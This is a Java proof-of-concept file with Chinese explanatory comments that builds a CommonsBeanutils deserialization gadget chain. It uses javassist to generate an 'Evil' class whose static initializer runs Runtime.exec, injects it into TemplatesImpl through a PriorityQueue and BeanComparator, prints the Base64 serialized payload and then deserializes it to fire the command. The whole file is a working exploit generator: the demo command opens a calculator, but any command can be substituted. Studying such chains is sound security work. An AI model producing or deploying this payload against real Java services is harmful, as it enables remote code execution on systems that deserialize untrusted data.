package CB;

import java.beans.beancontext.BeanContext;
import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.PriorityQueue;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;
import org.apache.commons.beanutils.BeanComparator;

/**
 * 依赖CC链
 * BeanComparator
 *在创建类的对象的时候可以为comparator赋予特定的比较器，值得注意的是如果没有设定自定义的comparator，
 * 其默认为ComparableComparator对象，当然，在调用链中，将会调用他的compare方法
 *而ComparableComparator来自cc链。
 *
 * CB链的反序列化问题是关键在于PriorityQueue.readObject
 */
public class CB_withCC {

    public static void setFieldValue(Object obj, String fieldname, Object value) throws IllegalAccessException, NoSuchFieldException {
        Field field = obj.getClass().getDeclaredField(fieldname);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws IOException, CannotCompileException, NotFoundException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
        //动态创建字节码
        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";
        //管理将要被创建的类
        ClassPool pool = ClassPool.getDefault();
        //创建新类
        CtClass ctClass = pool.makeClass("Evil");
        //将 cmd 字符串插入到类初始化器方法的开头。在类被加载时，cmd 字符串中的命令就会被执行。
        ctClass.makeClassInitializer().insertBefore(cmd);
        //转换xml文档
        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        byte[] bytes = ctClass.toBytecode();

        //TemplatesImpl可在运行时动态生成java代码
        TemplatesImpl templates = new TemplatesImpl();
        //这些属性的作用是为了在运行时动态生成Java代码，并将其编译成可执行的字节码
        //_name属性表示生成的Java类的名称
        setFieldValue(templates, "_name", "RoboTerh");
        //_tfactory属性表示用于创建Transformer对象的TransformerFactory实例（如果需要创建Transformer对象，则需要指定TransformerFactory实例）
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        //_bytecodes属性表示存储生成的Java类的字节码
        setFieldValue(templates, "_bytecodes", new byte[][]{bytes});

        //创建比较器，这里BeanComparator默认不传会使用cc中的ComparableComparator
        //BeanComparator是commons-beanutils提供的用来比较两个JavaBean是否相等的类
        BeanComparator beanComparator = new BeanComparator();
        PriorityQueue queue = new PriorityQueue(2, beanComparator);
        queue.add(1);
        queue.add(1);


        /**CB下的BeanComparator中是由CC中的ComparableComparator实现，而这个中如果初始化传入了property，
         * 就会去调用两个对象对应的 getter 方法，获取其属性值。而TemplatesImpl除了直接调newTransformer() 方法，还可以间接调getOutputProperties()
         *
         */
        //反射赋值
        setFieldValue(beanComparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{templates, templates});


        //序列化
        ByteArrayOutputStream baor = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baor);
        oos.writeObject(queue);
        oos.close();
        System.out.println(new String(Base64.getEncoder().encode(baor.toByteArray())));

        //反序列化
        ByteArrayInputStream bais = new ByteArrayInputStream(baor.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        Object o = ois.readObject();
        baor.close();

    }

}
